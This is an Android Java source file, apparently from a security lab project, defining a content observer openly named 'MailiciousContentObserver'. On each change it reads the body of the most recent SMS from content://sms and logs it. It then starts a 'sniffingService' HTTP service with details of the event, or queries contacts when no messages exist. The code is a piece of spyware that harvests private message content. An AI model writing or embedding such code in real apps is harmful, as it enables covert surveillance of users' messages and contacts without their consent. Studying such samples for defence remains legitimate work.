package com.isotlab.android.intentlogger;

import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.provider.ContactsContract;
import android.util.Log;

public class MailiciousContentObserver extends ContentObserver{
	
	private Context context;
	
	 public MailiciousContentObserver(Handler handler, Context context) {
		super(handler);
		this.context = context;
		// TODO Auto-generated constructor stub
	}

    @Override
    public void onChange(boolean selfChange) {
        super.onChange(selfChange);
        // save the message to the SD card here
        ContentResolver cr = this.context.getContentResolver();
        Uri uriSMSURI = Uri.parse("content://sms");
        Cursor cur = cr.query(uriSMSURI, null, null, null, null);
        if(cur.getCount() > 0) {
        	 // this will make it point to the first record, which is the last SMS sent
	        cur.moveToNext();
	        String content = cur.getString(cur.getColumnIndex("body"));
	        Log.d("Text Message: ", content);
	        
	        Intent sniffingService = new Intent(this.context, ServiceHttp.class);
	        sniffingService.putExtra("IntentActivity", new IntentActivity("android.provider.Telephony.SMS_SENT", 
	        		"null", this.getClass().getCanonicalName(), "null" ));
	        this.context.startService(sniffingService);  
	       
        	
        } else {
        
        	cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                    null, null, null, null);
        	 cur.moveToNext();
 	        Intent sniffingService = new Intent(this.context, ServiceHttp.class);
 	        sniffingService.putExtra("IntentActivity", new IntentActivity("android.provider.Contacts.CHANGED", 
 	        		"null", this.getClass().getCanonicalName(), "null" ));
 	        this.context.startService(sniffingService); 
	          
        }
		
	}
}
